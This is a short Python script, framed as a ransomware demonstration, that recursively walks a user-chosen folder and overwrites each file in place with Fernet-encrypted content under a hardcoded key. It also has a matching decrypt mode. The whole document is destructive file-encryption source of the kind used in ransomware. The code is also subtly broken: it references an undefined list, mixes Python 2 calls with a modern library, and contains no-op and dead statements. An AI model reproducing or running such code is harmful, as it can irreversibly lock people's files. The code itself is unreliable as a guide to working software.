#########################################################################################################################
# Warning: This script involves encryption of files. Please use at your own risk.
# Script will prompt to input the location and action(Encrypt/Decrypt) to test and experience how ransomware will behave.
# I have used cryptography module to encrypt the content of file and have given the key too.
#########################################################################################################################
import os,subprocess
from cryptography.fernet import Fernet
 
fpath_list = []
#Encryption symmertric key
key = b'dS-CU3TI1pHCaS_cSukrviippvmkmrz7pOcU3v9cq9c='
#You can generate your key using the below line
#key = Fernet.generate_key()
f = Fernet(key)
 
#Add the file location to the global list
def evaluate_file(file_loc):
    global fpath_list
    fpath_list.append(str(file_loc))
    ext_list.append(str(file_loc).split(".")[1])
 
#Loop through the given location recursively
def nav_folder(dir_path):
    if os.path.isdir(dir_path):
        files = os.listdir(dir_path)
        for f in files:
            if not f.startswith('.'):
                if os.path.isdir(os.path.join(dir_path,f)):
                    nav_folder(os.path.join(dir_path,f))
                else:
                    evaluate_file(os.path.join(dir_path,f))
    else:
        evaluate_file(dir_path)
 
#Encrypt each file in the filepath global list
def encrypt(s_loc):
    global f
    for file in fpath_list:
        fname = str(file).replace("\\", "\\")
        try:
            sfile = open(fname, 'rb')
            final_string = f.encrypt(sfile.read())
            sfile.close()
            sfile = open(fname, 'wb')
            sfile.write(bytes(final_string))
            sfile.close()
        except Exception as e:
            exp_file = open('error.log','w')
            exp_file.writelines(e.message)
            exp_file.close()
 
#Decrypt each file in the filepath global list
def decrypt(d_loc):
    global f
    for file in fpath_list:
        fname = str(file).replace("\\", "\\")
        try:
            sfile = open(fname, 'rb')
            final_string = f.decrypt(sfile.read())
            sfile.close()
            sfile = open(fname, 'wb')
            sfile.write(bytes(final_string))
            sfile.close()
        except Exception as e:
            exp_file = open('error.log', 'w')
            exp_file.writelines(e.message)
            exp_file.close()
 
 
def main():
    s_loc = raw_input("Enter the source location:")
    action = raw_input("Enter action encrypt/decrypt (E/D)")
    nav_folder(s_loc)
    if action == "E":
        encrypt(s_loc)
    elif action == "D":
        decrypt(s_loc)
    else:
        "Please enter proper action E or D"
if __name__ == '__main__':
     main()
